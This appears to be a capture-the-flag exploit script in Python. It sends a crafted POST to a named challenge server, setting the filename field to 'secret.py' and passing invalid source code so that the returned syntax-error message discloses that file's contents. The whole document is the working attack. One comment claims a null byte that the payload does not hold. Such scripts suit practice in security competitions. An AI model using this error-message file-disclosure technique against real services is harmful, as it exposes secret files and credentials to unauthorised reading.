import requests

# URL of the challenge server
url = 'http://python.ctf.theromanxpl0.it:7001/check'

# Craft the payload to read secret.py and cause a syntax error
payload = {
    "source": "\n\n\n\n\n\nb b",  # Invalid syntax with null byte
    "filename": "secret.py"
}

# Send the POST request
response = requests.post(url, json=payload)

# Print the error message which contains the content of secret.py
print(response.json()['error'])
